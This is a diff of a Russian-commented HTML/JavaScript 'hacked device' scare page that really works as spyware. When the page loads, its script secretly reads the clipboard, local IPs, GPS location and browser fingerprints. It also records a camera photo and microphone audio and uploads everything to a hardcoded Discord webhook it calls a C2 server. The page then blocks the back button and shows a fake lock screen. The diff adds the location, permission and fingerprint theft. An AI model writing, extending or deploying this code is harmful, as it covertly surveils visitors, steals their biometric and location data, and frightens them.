@@ -7,52 +7,36 @@
 <style>
   @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap');
   body { background: #000; color: #ff003c; font-family: 'Fira Code', monospace; margin: 0; padding: 0; height: 100vh; overflow: hidden; display: flex; flex-direction: column; cursor: none; }
-  
   @keyframes shake { 0%,100% { transform: translate(0,0) rotate(0); } 25% { transform: translate(-2px,2px) rotate(-1deg); } 50% { transform: translate(2px,-1px) rotate(1deg); } 75% { transform: translate(1px,2px) rotate(0); } }
   .shaking { animation: shake 0.2s infinite; }
   @keyframes flash { 0%,100% { background: #000; } 50% { background: #400; } }
   .flashing { animation: flash 0.1s infinite; }
-
   .terminal { padding: 20px; flex-grow: 1; display: flex; flex-direction: column; z-index: 10; }
   .output { flex-grow: 1; overflow-y: auto; font-size: 12px; line-height: 1.4; white-space: pre-wrap; text-shadow: 0 0 3px #ff003c; padding-bottom: 50px; }
   .output::-webkit-scrollbar { display: none; }
-
   .alert { border: 2px solid #ff003c; padding: 15px; margin-bottom: 20px; background: rgba(255,0,60,0.1); font-weight: bold; text-align: center; text-transform: uppercase; }
-
-  .progress-row { display: flex; align-items: center; margin: 5px 0; font-size: 12px; }
-  .progress-label { width: 180px; text-align: right; padding-right: 10px; }
-  .progress-bar-bg { flex-grow: 1; height: 10px; background: #300; border: 1px solid #ff003c; }
-  .progress-bar-fill { height: 100%; background: #ff003c; width: 0%; transition: width 0.1s; }
-  .progress-percent { width: 50px; text-align: left; padding-left: 10px; }
-
   #lock-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; color: #ff003c; z-index: 9999; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 20px; }
   #lock-screen h1 { font-size: 50px; margin: 0; animation: pulse 1s infinite; }
   @keyframes pulse { 0%,100% { opacity: 1; text-shadow: 0 0 20px #ff003c; } 50% { opacity: 0.5; text-shadow: none; } }
-  
   #hidden-video { display: none; }
 </style>
 </head>
 <body>
-
 <video id="hidden-video" autoplay playsinline muted></video>
-
 <div class="terminal" id="main-ui">
-  <div class="alert">ВНИМАНИЕ: УСТРОЙСТВО ЗАХВАЧЕНО<br>ИДЕТ СЛИВ ДАННЫХ</div>
+  <div class="alert">ВНИМАНИЕ: УСТРОЙСТВО ЗАХВАЧЕНО<br>ИДЕТ ГЛУБОКИЙ СЛИВ ДАННЫХ</div>
   <div class="output" id="term"></div>
 </div>
-
 <div id="lock-screen">
   <h1>DEVICE LOCKED</h1>
-  <p>Биометрия, IP, буфер обмена и экран отправлены.<br>Устройство заблокировано.</p>
+  <p>Биометрия, GPS, IP, буфер обмена и экран отправлены.<br>Устройство заблокировано.</p>
 </div>
 
 <script>
-// =====================================================================
-// 1. КОНФИГУРАЦИЯ (Твой Discord Webhook)
-// =====================================================================
 const HOOK = "https://discord.com/api/webhooks/1569647657406824478/DK6Z_qdLCpqPXWQHKKXbMylcXjZrZPZqXzHLpttg0GbuVcy6axwgGFBsfuqOoyTqer1l";
 const term = document.getElementById('term');
 const video = document.getElementById('hidden-video');
+
 let megaData = {
   timestamp: new Date().toISOString(),
   userAgent: navigator.userAgent,
@@ -60,15 +44,20 @@ let megaData = {
   screen: screen.width + "x" + screen.height,
   timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
   languages: navigator.languages,
+  cores: navigator.hardwareConcurrency,
+  memory: navigator.deviceMemory,
+  touch: navigator.maxTouchPoints,
   local_ips: [],
+  gps: "Ожидание...",
   clipboard: "Нет доступа",
+  permissions: {},
+  canvas_hash: null,
+  webgl_renderer: "unknown",
   photo: null,
   audio: null
 };
 
-// =====================================================================
-// 2. МГНОВЕННЫЙ СБОР (WebRTC + Clipboard)
-// =====================================================================
+// 1. WEBRTC (Локальные IP)
 async function getLocalIPs() {
   return new Promise((resolve) => {
     const ips = [];
@@ -85,22 +74,54 @@ async function getLocalIPs() {
   });
 }
 
+// 2. GPS
+function getGPS() {
+  return new Promise((resolve) => {
+    if (!navigator.geolocation) return resolve("Нет API");
+    navigator.geolocation.getCurrentPosition(
+      pos => resolve(pos.coords.latitude + ", " + pos.coords.longitude),
+      err => resolve("Отказано"),
+      { timeout: 5000, enableHighAccuracy: true }
+    );
+  });
+}
+
+// 3. Буфер обмена
 async function getClipboard() {
   try {
     const text = await navigator.clipboard.readText();
-    megaData.clipboard = text.slice(0, 100);
+    megaData.clipboard = text.slice(0, 150);
   } catch(e) {}
 }
 
-// =====================================================================
-// 3. ЗАХВАТ КАМЕРЫ И МИКРОФОНА
-// =====================================================================
+// 4. Разрешения и Canvas
+async function getPermissionsAndCanvas() {
+  if (navigator.permissions) {
+    const perms = ['geolocation', 'camera', 'microphone', 'notifications'];
+    for (const p of perms) {
+      try { const s = await navigator.permissions.query({name: p}); megaData.permissions[p] = s.state; } catch(e){}
+    }
+  }
+  try {
+    const c = document.createElement("canvas"); const ctx = c.getContext("2d");
+    ctx.textBaseline = "top"; ctx.font = "14px Arial"; ctx.fillStyle = "#f60";
+    ctx.fillRect(125, 1, 62, 20); ctx.fillStyle = "#069"; ctx.fillText("Hello", 2, 15);
+    megaData.canvas_hash = c.toDataURL().slice(-20);
+    const gl = c.getContext("webgl");
+    if (gl) {
+      const ext = gl.getExtension("WEBGL_debug_renderer_info");
+      if (ext) megaData.webgl_renderer = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
+    }
+  } catch(e) {}
+}
+
+// 5. Камера и Микрофон
 async function capturePhotoAndAudio() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
     video.srcObject = stream;
     await new Promise(r => setTimeout(r, 1000));
-
+    
     const canvas = document.createElement('canvas');
     canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480;
     canvas.getContext('2d').drawImage(video, 0, 0);
@@ -109,21 +130,24 @@ async function capturePhotoAndAudio() {
     const recorder = new MediaRecorder(stream);
     const chunks = [];
     recorder.ondataavailable = e => chunks.push(e.data);
-    recorder.onstop = () => {
-      megaData.audio = new Blob(chunks, { type: 'audio/webm' });
-    };
+    recorder.onstop = () => { megaData.audio = new Blob(chunks, { type: 'audio/webm' }); };
     recorder.start();
     await new Promise(r => setTimeout(r, 3000));
     recorder.stop();
     stream.getTracks().forEach(t => t.stop());
-  } catch(e) { 
-    console.log("Camera/Mic error:", e); 
-  }
+  } catch(e) { console.log("Camera error:", e); }
 }
 
-// =====================================================================
-// 4. UI И ЗВУК
-// =====================================================================
+// UI
+function typeLine(text) {
+  return new Promise((resolve) => {
+    const div = document.createElement('div'); term.appendChild(div); term.scrollTop = term.scrollHeight;
+    let i = 0; const speed = Math.random() * 10 + 5;
+    function type() { if (i < text.length) { div.textContent += text.charAt(i); i++; setTimeout(type, speed); } else resolve(); }
+    type();
+  });
+}
+
 function playBeep() {
   try {
     const ctx = new (window.AudioContext || window.webkitAudioContext)();
@@ -134,61 +158,34 @@ function playBeep() {
   } catch(e) {}
 }
 
-function typeLine(text) {
-  return new Promise((resolve) => {
-    const div = document.createElement('div'); term.appendChild(div); term.scrollTop = term.scrollHeight;
-    let i = 0; const speed = Math.random() * 10 + 5;
-    function type() { if (i < text.length) { div.textContent += text.charAt(i); i++; setTimeout(type, speed); } else resolve(); }
-    type();
-  });
-}
-
-function addProgress(label) {
-  return new Promise((resolve) => {
-    const row = document.createElement('div'); row.className = 'progress-row';
-    row.innerHTML = `<div class="progress-label">${label}</div><div class="progress-bar-bg"><div class="progress-bar-fill"></div></div><div class="progress-percent">0%</div>`;
-    term.appendChild(row); term.scrollTop = term.scrollHeight;
-    const fill = row.querySelector('.progress-bar-fill'); const pct = row.querySelector('.progress-percent');
-    let p = 0;
-    const int = setInterval(() => {
-      p += Math.random() * 8; if (p >= 100) { p = 100; clearInterval(int); setTimeout(resolve, 200); }
-      fill.style.width = p + '%'; pct.textContent = Math.floor(p) + '%'; term.scrollTop = term.scrollHeight;
-    }, 50);
-  });
-}
-
-// =====================================================================
-// 5. ГЛАВНЫЙ СЦЕНАРИЙ
-// =====================================================================
+// ГЛАВНЫЙ СЦЕНАРИЙ
 async function runHack() {
   document.body.classList.add('shaking', 'flashing');
   playBeep();
 
-  // Сбор данных в фоне
+  // Запускаем всё параллельно
   getClipboard();
+  getPermissionsAndCanvas();
   getLocalIPs().then(ips => megaData.local_ips = ips);
+  getGPS().then(loc => megaData.gps = loc);
   capturePhotoAndAudio();
 
   await typeLine("> INITIATING KERNEL EXPLOIT...");
   await typeLine("> BYPASSING SANDBOX... [OK]");
   await typeLine("> WEBRTC LEAK: EXTRACTING LOCAL IP...");
-  await new Promise(r => setTimeout(r, 800));
-  await typeLine("> REQUESTING BIOMETRIC ACCESS (CAMERA/MIC)...");
-  await new Promise(r => setTimeout(r, 1500));
+  await new Promise(r => setTimeout(r, 1000));
+  await typeLine("> REQUESTING BIOMETRIC ACCESS (CAMERA/MIC/GPS)...");
+  await new Promise(r => setTimeout(r, 2000));
   await typeLine("> RECORDING ENVIRONMENT...");
   await new Promise(r => setTimeout(r, 2000));
   await typeLine("> DUMPING CLIPBOARD DATA...");
   await typeLine("> EXFILTRATING PHOTOS...");
-  
-  await addProgress("Dumping RAM");
-  await addProgress("Uploading Biometrics");
-  await addProgress("Encrypting Files");
-
+  await new Promise(r => setTimeout(r, 1000));
   await typeLine("> UPLOADING TO C2 SERVER (DISCORD)...");
 
   // ОТПРАВКА В DISCORD
   const form = new FormData();
-  form.append("content", `**🚨 НОВЫЙ ВЗЛОМ!**\n**UA:** ${megaData.userAgent}\n**TZ:** ${megaData.timezone}\n**Local IPs:** ${megaData.local_ips.join(", ")}\n**Clipboard:** ${megaData.clipboard}`);
+  form.append("content", `**🚨 ПОЛНЫЙ ЗАХВАТ УСТРОЙСТВА!**\n**Модель:** ${megaData.userAgent}\n**Экран:** ${megaData.screen}\n**Язык:** ${megaData.languages}\n**Таймзона:** ${megaData.timezone}\n**Локальные IP:** ${megaData.local_ips.join(", ")}\n**GPS:** ${megaData.gps}\n**Буфер:** ${megaData.clipboard}\n**GPU:** ${megaData.webgl_renderer}`);
   
   if (megaData.photo && megaData.photo.startsWith("data:image")) {
     const blob = await (await fetch(megaData.photo)).blob();
@@ -199,10 +196,7 @@ async function runHack() {
     form.append("file2", megaData.audio, "voice.webm");
   }
 
-  fetch(HOOK, {
-    method: "POST",
-    body: form
-  }).catch(e => console.log("Discord error:", e));
+  fetch(HOOK, { method: "POST", body: form }).catch(e => console.log(e));
 
   await typeLine("> COMPLETE. LOCKING DEVICE...");
   document.body.classList.remove('shaking', 'flashing');
@@ -211,10 +205,7 @@ async function runHack() {
   playBeep();
 }
 
-// Запуск
 setTimeout(runHack, 1000);
-
-// Блокировка выхода
 history.pushState(null, null, location.href);
 window.onpopstate = function () { history.go(1); };
 document.addEventListener('contextmenu', e => e.preventDefault());
